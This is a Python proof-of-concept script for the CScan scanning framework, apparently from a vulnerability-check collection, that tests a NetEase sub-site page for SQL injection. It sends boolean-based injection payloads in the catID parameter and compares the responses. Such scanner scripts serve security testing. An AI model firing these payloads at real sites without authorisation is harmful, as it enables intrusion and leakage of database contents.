# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '163_0009'  # 平台漏洞编号
    name = '网易旗下分站存在注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-08-29'  # 漏洞公布时间
    desc = '''
        网易旗下分站存在注入漏洞，攻击者可以通过构造恶意SQL语句泄露出数据库中的重要信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=136
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网易'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '206d402f-fc0f-4cbb-8dbe-29b95753b392'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)

            payload1 = "/new_web/cm_lv2_pic.jsp?type=0&catID=50' and '233'='233"
            payload2 = "/new_web/cm_lv2_pic.jsp?type=0&catID=50' and '233'='234"
            vul_url1 = arg + payload1
            vul_url2 = arg + payload2
            response1 = requests.get(vul_url1)
            response2 = requests.get(vul_url2)

            if response1.text != response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
